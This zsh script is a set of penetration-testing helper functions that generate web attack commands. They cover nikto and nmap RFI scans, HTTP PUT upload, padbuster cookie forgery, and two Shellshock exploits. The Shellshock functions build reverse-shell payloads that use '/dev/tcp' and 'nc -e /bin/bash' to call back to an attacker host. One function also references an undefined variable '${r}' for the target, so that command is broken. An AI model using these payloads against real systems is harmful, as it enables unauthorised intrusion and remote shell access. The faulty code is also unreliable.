#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-vuln
#############################################################

qq-enum-web-vuln-nikto() {
  qq-vars-set-url
  print -z "nikto -useragent \"${__UA}\" -h ${__URL} -o $(__urlpath)/nikto.txt"
}

qq-enum-web-vuln-nmap-rfi() {
  qq-vars-set-rhost
  print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' ${__RHOST}"
}

qq-enum-web-vuln-shellshock-cookie() {
  qq-vars-set-lhost
  local p && read "port?$fg[cyan]LPORT:$reset_color "
  print -z "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/${__LHOST}/${p} 0>&1"
}

qq-enum-web-vuln-shellshock-nc() {
  qq-vars-set-lhost
  qq-vars-set-rhost
  local p && read "port?$fg[cyan]LPORT:$reset_color "
  print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${__LHOST} ${p} -e /bin/bash\"' http://${r}/cgi-bin/status"
}

qq-enum-web-vuln-put-curl() {
  qq-vars-set-rhost
  local f=$(rlwrap -S "$fg[cyan]FILE: $reset_color" -e '' -c -o cat)
  print -z "curl -L -T ${f} http://${__RHOST}/${f}"
}

qq-enum-web-vuln-padbuster-check() {
  qq-vars-set-rhost
  local cn && read "cn?$fg[cyan]COOKIE_NAME: $reset_color"
  local cv && read "cv?$fg[cyan]COOKIE_VALUE: $reset_color"
  print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
}

qq-enum-web-vuln-padbuster-forge() {
  qq-vars-set-rhost
  local cn && read "cn?$fg[cyan]COOKIE_NAME: $reset_color"
  local cv && read "cv?$fg[cyan]COOKIE_VALUE: $reset_color"
  local u && read "u?$fg[cyan]USER: $reset_color"
  print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${u}"
}